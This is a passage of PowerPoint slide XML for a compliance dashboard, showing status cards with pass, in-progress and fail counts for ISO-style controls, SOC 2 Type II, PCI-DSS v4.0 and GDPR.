            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="2600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>70%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="2651760"/>
            <a:ext cx="2578608" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>14/20 controls passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="2889504"/>
            <a:ext cx="2578608"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6616" y="2889504"/>
            <a:ext cx="1805025" cy="91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3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓ Passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1271016" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⟳ In Prog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1271016" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2185416" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✗ Failing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2185416" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="356616" y="3538728"/>
            <a:ext cx="2578608" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>114 controls. A.12 Operations Security has 2 critical failures.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Rectangle 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3136392" y="2148840"/>
            <a:ext cx="2834640" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="1016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136392" y="2148840"/>
            <a:ext cx="2834640" cy="54864"/>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64408" y="2258568"/>
            <a:ext cx="2578608" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SOC 2 Type II</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="TextBox 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4965192" y="2221992"/>
            <a:ext cx="914400" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="2600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>65%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="2651760"/>
            <a:ext cx="2578608" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11/17 controls passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="2889504"/>
            <a:ext cx="2578608"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64408" y="2889504"/>
            <a:ext cx="1676095" cy="914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64408" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓ Passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4178808" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⟳ In Prog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4178808" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="TextBox 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✗ Failing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="TextBox 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="TextBox 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="3538728"/>
            <a:ext cx="2578608" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trust Service Criteria. CC6.1 (logical access) at risk.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6044184" y="2148840"/>
            <a:ext cx="2834640" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="1016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44184" y="2148840"/>
            <a:ext cx="2834640" cy="54864"/>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72200" y="2258568"/>
            <a:ext cx="2578608" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PCI-DSS v4.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7872984" y="2221992"/>
            <a:ext cx="914400" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="2600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>58%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2651760"/>
            <a:ext cx="2578608" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>9/16 controls passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2889504"/>
            <a:ext cx="2578608"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2200" y="2889504"/>
            <a:ext cx="1495592" cy="914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72200" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓ Passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⟳ In Prog</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✗ Failing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3538728"/>
            <a:ext cx="2578608" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12 requirements. Req 6 (secure systems) failing on 3 controls.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Rectangle 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8951976" y="2148840"/>
            <a:ext cx="2834640" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="1016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951976" y="2148840"/>
            <a:ext cx="2834640" cy="54864"/>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079992" y="2258568"/>
            <a:ext cx="2578608" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GDPR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10780776" y="2221992"/>
            <a:ext cx="914400" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="2600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>62%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="2651760"/>
            <a:ext cx="2578608" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10/16 controls passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Rectangle 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="2889504"/>
            <a:ext cx="2578608" cy="91440"/>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79992" y="2889504"/>
            <a:ext cx="1598736" cy="914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79992" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓ Passing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="3227832"/>
            <a:ext cx="868680" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9994392" y="3054096"/>
            <a:ext cx="868680" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
